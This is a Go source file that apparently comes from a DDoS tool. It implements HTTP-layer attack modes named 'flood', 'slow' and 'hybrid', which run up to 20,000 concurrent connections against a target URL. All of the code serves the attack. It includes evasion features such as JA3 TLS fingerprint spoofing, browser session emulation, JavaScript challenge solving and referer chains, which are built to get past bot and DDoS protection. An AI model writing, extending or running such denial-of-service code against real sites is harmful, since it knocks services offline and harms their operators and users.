package core

import (
    "context"
    "fmt"
    "net/url"
    "sync"
    "time"

    "byter/core/l7"
)

const maxL7Workers = 20000
const fetchTimeout = 45 * time.Second

func L7Asymmetric(st *EngineState, stop <-chan struct{}) error {
    cfg := st.L7
    if cfg.URL == "" {
        return fmt.Errorf("u URL not set.")
    }
    u, err := url.Parse(cfg.URL)
    if err != nil {
        return err
    }
    hostname := u.Hostname()

    switch cfg.Mode {
    case "flood":
        return runFlood(st, hostname, stop)
    case "hybrid":
        return runHybrid(st, hostname, stop)
    default:
        return runSlow(st, hostname, stop)
    }
}

func runFlood(st *EngineState, hostname string, stop <-chan struct{}) error {
    cfg := st.L7
    total := cfg.Threads * cfg.ConnPerThread
    if total > maxL7Workers {
        fmt.Printf("[L7-FLOOD] warning: %d exceed the ceiling, force back %d\n", total, maxL7Workers)
        total = maxL7Workers
    }

    fmt.Printf("[L7-FLOOD] -> %s | threads=%d ja3=%v http2=%v\n",
        cfg.URL, total, cfg.JA3Spoof, cfg.HTTP2)

    ctx, cancel := context.WithCancel(context.Background())
    defer cancel()
    go func() {
        <-stop
        cancel()
    }()

    fe := l7.NewFloodEngine(cfg.URL, total, hostname, cfg.JA3Spoof, cfg.HTTP2)

    done := make(chan struct{})
    go func() {
        ticker := time.NewTicker(500 * time.Millisecond)
        defer ticker.Stop()
        var ls, lf uint64
        for {
            select {
            case <-done:
                return
            case <-ticker.C:
                s, f, c := fe.Snapshot()
                ds := s - ls
                df := f - lf
                ls, lf = s, f
                for i := uint64(0); i < ds; i++ {
                    st.Counters.IncSuccess(0)
                }
                for i := uint64(0); i < df; i++ {
                    st.Counters.IncFail()
                }
                st.Counters.ConnAdd(c)
            }
        }
    }()

    fe.Run(ctx, stop)
    close(done)
    return nil
}

func runSlow(st *EngineState, hostname string, stop <-chan struct{}) error {
    cfg := st.L7
    threads := cfg.Threads
    if threads < 1 {
        threads = 1
    }
    connPer := cfg.ConnPerThread
    if connPer < 1 {
        connPer = 1
    }
    total := threads * connPer
    if total > maxL7Workers {
        fmt.Printf("[L7-SLOW] warning: %d exceed the ceiling, force back %d\n", total, maxL7Workers)
        total = maxL7Workers
    }

    fmt.Printf("[L7-SLOW] -> %s | total_conns=%d browser=%s js=%s ja3=%v http2=%v referer=%v\n",
        cfg.URL, total, cfg.Browser, cfg.JSSolver, cfg.JA3Spoof, cfg.HTTP2, cfg.RefererChain)

    sem := make(chan struct{}, total)
    var wg sync.WaitGroup

    for i := 0; i < total; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            for {
                select {
                case <-stop:
                    return
                case sem <- struct{}{}:
                }

                done := make(chan error, 1)
                go func() {
                    sess, err := l7.NewSession(cfg.Browser)
                    if err != nil {
                        done <- err
                        return
                    }
                    st.Counters.ConnAdd(1)
                    client := l7.NewClient(sess, cfg.JA3Spoof, cfg.HTTP2, fetchTimeout, hostname)
                    err = l7.FetchFlow(client, sess, cfg.URL, cfg.WinShrink, cfg.Interval, cfg.RefererChain, cfg.JSSolver)
                    st.Counters.ConnAdd(-1)
                    done <- err
                }()

                select {
                case err := <-done:
                    if err != nil {
                        st.Counters.IncFail()
                    } else {
                        st.Counters.IncSuccess(0)
                    }
                case <-time.After(fetchTimeout + 5*time.Second):
                    st.Counters.IncFail()
                }

                <-sem
                select {
                case <-stop:
                    return
                case <-time.After(50 * time.Millisecond):
                }
            }
        }()
    }
    <-stop
    wg.Wait()
    return nil
}

func runHybrid(st *EngineState, hostname string, stop <-chan struct{}) error {
    fmt.Println("[L7-HYBRID] flood + slow parallel")

    var wg sync.WaitGroup
    wg.Add(2)

    go func() {
        defer wg.Done()
        _ = runFlood(st, hostname, stop)
    }()
    go func() {
        defer wg.Done()
        _ = runSlow(st, hostname, stop)
    }()

    wg.Wait()
    return nil
}